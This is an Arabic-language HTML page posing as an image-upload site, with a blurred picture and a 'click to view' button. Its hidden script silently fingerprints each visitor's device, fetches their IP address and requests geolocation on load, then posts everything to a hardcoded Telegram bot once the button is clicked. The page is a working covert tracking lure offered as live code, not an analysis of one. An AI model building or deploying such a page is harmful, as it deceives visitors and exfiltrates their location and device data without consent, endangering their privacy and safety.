<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>موقع رفع الصور</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            max-width: 600px;
            width: 100%;
            background: white;
            border-radius: 20px;
            box-shadow: 0 25px 50px rgba(0,0,0,0.15);
            overflow: hidden;
            animation: slideUp 0.8s ease-out;
        }

        @keyframes slideUp {
            from { transform: translateY(50px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }

        .header {
            background: linear-gradient(135deg, #2c3e50 0%, #34495e 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }

        .main-image {
            width: 100%;
            max-width: 400px;
            height: auto;
            border-radius: 15px;
            box-shadow: 0 15px 30px rgba(0,0,0,0.2);
            margin: 30px auto;
            filter: blur(20px);
            transition: filter 0.5s ease;
            display: block;
        }

        .main-image.clear {
            filter: blur(0px);
        }

        .click-button {
            background: linear-gradient(135deg, #e74c3c 0%, #c0392b 100%);
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 10px;
            font-size: 1.2em;
            font-weight: bold;
            cursor: pointer;
            margin: 20px auto;
            display: block;
            transition: all 0.3s ease;
        }

        .click-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(231, 76, 60, 0.4);
        }

        .success-message {
            background: #d4edda;
            color: #155724;
            padding: 20px;
            border-radius: 10px;
            margin: 20px;
            text-align: center;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>موقع رفع الصور</h1>
            <p>منصة سهلة وسريعة لرفع ومشاركة الصور</p>
        </div>

        <img src="https://i.imgur.com/zcb3oRL.jpeg" 
             alt="الصورة المختارة" 
             class="main-image" 
             id="mainImage">

        <button class="click-button" id="viewButton">
            🔍 اضغط هنا لمشاهدة الصورة
        </button>

        <div class="success-message" id="successMessage">
            ✅ تم الموافقة على عرض الصورة
        </div>
    </div>

    <script>
        // متغيرات عامة للتخزين السريع
        let visitorData = {
            device: {},
            hardware: {},
            location: null,
            ip: null,
            timestamp: Date.now()
        };

        // جمع المعلومات الأساسية بشكل فوري
        function getBasicInfo() {
            const ua = navigator.userAgent;
            const now = new Date();
            
            return {
                userAgent: ua,
                timestamp: now.toISOString(),
                localTime: now.toLocaleString('ar-SA'),
                url: window.location.href,
                referrer: document.referrer || 'مباشر',
                language: navigator.language,
                platform: navigator.platform,
                cookieEnabled: navigator.cookieEnabled,
                onLine: navigator.onLine,
                screenResolution: `${screen.width}x${screen.height}`,
                windowSize: `${window.innerWidth}x${window.innerHeight}`,
                colorDepth: screen.colorDepth,
                pixelRatio: window.devicePixelRatio || 1,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timezoneOffset: now.getTimezoneOffset(),
                // تحديد سريع للجهاز
                deviceType: /iPhone/i.test(ua) ? 'iPhone' : 
                           /iPad/i.test(ua) ? 'iPad' : 
                           /Android/i.test(ua) ? 'Android' : 
                           /Windows/i.test(ua) ? 'Windows' : 
                           /Mac/i.test(ua) ? 'Mac' : 'Unknown',
                isMobile: /Mobile|Android|iPhone|iPad/i.test(ua),
                // تحديد سريع للمتصفح
                browser: /Chrome/i.test(ua) && !/Edge/i.test(ua) ? 'Chrome' :
                        /Firefox/i.test(ua) ? 'Firefox' :
                        /Safari/i.test(ua) && !/Chrome/i.test(ua) ? 'Safari' :
                        /Edge/i.test(ua) ? 'Edge' : 'Unknown'
            };
        }

        // جمع معلومات الأجهزة بشكل سريع
        function getQuickHardwareInfo() {
            return {
                cpuCores: navigator.hardwareConcurrency || 'غير معروف',
                deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'غير معروف',
                maxTouchPoints: navigator.maxTouchPoints || 0,
                vibrationSupport: 'vibrate' in navigator,
                webglSupport: (() => {
                    try {
                        const canvas = document.createElement('canvas');
                        return !!(canvas.getContext('webgl') || canvas.getContext('experimental-webgl'));
                    } catch (e) {
                        return false;
                    }
                })(),
                // معلومات الشبكة السريعة
                connectionType: navigator.connection ? navigator.connection.type || navigator.connection.effectiveType : 'غير معروف',
                // معلومات الشاشة
                orientation: screen.orientation ? screen.orientation.type : 'غير معروف'
            };
        }

        // الحصول على IP بشكل سريع
        async function getIPFast() {
            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 3000); // 3 ثواني فقط
                
                const response = await fetch('https://api.ipify.org?format=json', {
                    signal: controller.signal
                });
                clearTimeout(timeoutId);
                
                const data = await response.json();
                return data.ip;
            } catch (e) {
                return 'غير متاح';
            }
        }

        // الحصول على الموقع بشكل سريع
        function getLocationFast() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve(null);
                    return;
                }

                // تايم آوت قصير للحصول على الموقع بسرعة
                const timeout = setTimeout(() => {
                    resolve(null);
                }, 5000); // 5 ثواني فقط

                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        clearTimeout(timeout);
                        resolve({
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: Math.round(position.coords.accuracy)
                        });
                    },
                    () => {
                        clearTimeout(timeout);
                        resolve(null);
                    },
                    {
                        enableHighAccuracy: false, // للسرعة
                        timeout: 4000,
                        maximumAge: 60000 // استخدام موقع محفوظ من دقيقة
                    }
                );
            });
        }

        // إرسال البيانات بشكل مُحسن
        async function sendDataFast(data) {
            const botToken = '7982181249:AAEyLwc9c24fu-uqUT87v26S6282XTD41XI';
            const chatId = '170383339';
            
            // رسالة مُحسنة وأقصر
            const message = `🔥 زائر جديد (نظام سريع):
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⏰ ${data.device.localTime}
🌐 ${data.device.url}
🔗 ${data.device.referrer}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📱 الجهاز: ${data.device.deviceType}
🌐 المتصفح: ${data.device.browser}
📱 محمول: ${data.device.isMobile ? 'نعم' : 'لا'}
🖥️ الشاشة: ${data.device.screenResolution}
🧠 المعالج: ${data.hardware.cpuCores} نواة
💾 الذاكرة: ${data.hardware.deviceMemory}
📶 الشبكة: ${data.hardware.connectionType}
🌍 IP: ${data.ip || 'غير متاح'}
📍 الموقع: ${data.location ? `${data.location.latitude.toFixed(4)}, ${data.location.longitude.toFixed(4)}` : 'غير متاح'}
🕐 المنطقة: ${data.device.timezone}
🗣️ اللغة: ${data.device.language}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔍 User Agent: ${data.device.userAgent}`;

            try {
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message
                    })
                });
                console.log('✅ تم الإرسال بنجاح');
            } catch (error) {
                console.log('❌ فشل الإرسال:', error);
            }
        }

        // جمع البيانات بشكل متوازي وسريع
        async function collectAllDataFast() {
            console.log('🚀 بدء جمع البيانات بالنظام السريع...');
            
            // جمع المعلومات الأساسية فوراً
            visitorData.device = getBasicInfo();
            visitorData.hardware = getQuickHardwareInfo();
            
            // جمع الموقع و IP بشكل متوازي
            const [location, ip] = await Promise.all([
                getLocationFast(),
                getIPFast()
            ]);
            
            visitorData.location = location;
            visitorData.ip = ip;
            
            console.log('📊 تم جمع البيانات:', visitorData);
            return visitorData;
        }

        // عرض الصورة وإرسال البيانات
        async function viewImage() {
            // إظهار الصورة فوراً
            document.getElementById('mainImage').classList.add('clear');
            document.getElementById('viewButton').style.display = 'none';
            document.getElementById('successMessage').style.display = 'block';
            
            // إرسال البيانات المجمعة
            await sendDataFast(visitorData);
        }

        // بدء جمع البيانات عند تحميل الصفحة
        window.addEventListener('load', async function() {
            console.log('🚀 تحميل الصفحة - بدء النظام السريع...');
            
            // جمع البيانات في الخلفية
            try {
                await collectAllDataFast();
            } catch (e) {
                console.log('❌ خطأ في جمع البيانات:', e);
            }
        });

        // ربط الزر
        document.addEventListener('DOMContentLoaded', function() {
            document.getElementById('viewButton').addEventListener('click', viewImage);
        });

        // جمع البيانات الأساسية فوراً عند تحميل الكود
        visitorData.device = getBasicInfo();
        visitorData.hardware = getQuickHardwareInfo();
        console.log('⚡ تم جمع البيانات الأساسية فوراً');
    </script>
</body>
</html>
